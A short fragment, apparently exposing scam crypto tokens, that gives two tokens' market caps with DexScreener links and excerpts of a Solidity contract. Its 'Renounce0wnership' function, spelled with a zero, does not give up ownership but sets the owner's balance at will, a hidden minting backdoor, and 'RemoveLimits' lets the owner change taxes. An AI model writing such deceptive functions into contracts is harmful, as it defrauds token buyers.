...
CloudChat on BSC is at 47M (https://dexscreener.com/bsc/0x067d695ae56e5e0d33decd9584a55e911325d7f0)
Shit on ETH is at 77M (https://dexscreener.com/ethereum/0x9112d1761124d4ec7aca02014d6e215970f87e33)
...
contract test is Context, IERC20, Ownable {
    ...
    function RemoveLimits(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function Renounce0wnership()  public onlyOwner()   {_accBalances[getOwner()] = settokendecimals; }
